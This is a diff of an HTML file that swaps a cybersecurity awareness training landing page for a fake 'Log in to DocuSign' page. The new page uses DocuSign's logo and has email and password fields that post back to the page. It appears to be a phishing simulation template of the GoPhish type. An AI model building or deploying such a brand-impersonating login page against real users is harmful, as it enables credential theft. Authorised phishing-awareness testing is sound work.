@@ -3,71 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cybersecurity Awareness Training</title>
+    <title>Log in to DocuSign</title>
     <style>
-        /* General body styling */
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            background-color: #f4f4f9;
             margin: 0;
             padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-
-        /* Centered container for content */
         .container {
-            width: 100%;
-            max-width: 600px;
-            margin: 50px auto;
             background-color: #ffffff;
+            padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+        .logo {
+            width: 200px;
+            margin: 0 auto;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #333333;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #666666;
+            margin-bottom: 10px;
+        }
+        .input-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        label {
+            font-size: 14px;
+            color: #333333;
+            display: block;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .submit-button {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: #800080; /* Viola */
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+            margin: 10px;
+        }
+        .submit-button:hover {
+            background-color: #6b006b;
+        }
+        .signup-link {
+            display: block;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #000000; /* Nero */
+            text-decoration: none;
             text-align: center;
         }
-
-        /* Headline styling */
-        h1 {
-            color: #333333;
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-
-        /* Paragraph styling */
-        p {
-            color: #666666;
-            font-size: 16px;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-
-        /* Button styling */
-        .button {
-            display: inline-block;
-            padding: 12px 24px;
-            background-color: #5C2D91;
-            color: #ffffff;
-            text-decoration: none;
-            font-weight: bold;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-
-        /* Hover effect for the button */
-        .button:hover {
-            background-color: #4a2376;
+        .signup-link:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Welcome to Cybersecurity Awareness Training</h1>
-        <p>
-            Thank you for taking the time to improve your cybersecurity knowledge. 
-            This training will help you identify and avoid potential phishing attacks.
-        </p>
-        <a class="button" href="{{.Tracker}}" target="_blank" rel="noopener noreferrer">
-            Start Training
-        </a>
+        <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="Logo DocuSign" class="logo">
+        <h1>Log in to DocuSign</h1>
+        <p class="subtitle">Enter your email to log in.</p>
+        <div class="input-container">
+            <form action="" method="post">
+                <label for="email">Email*</label>
+                <input type="email" id="email" name="email" placeholder="Enter email">
+                <label for="email">Password*</label>
+                <input type="password" id="password" name="password" placeholder="Enter password">
+                <input type="submit" value="NEXT" class="submit-button"/>
+            </form>
+        </div>
     </div>
 </body>
 </html>
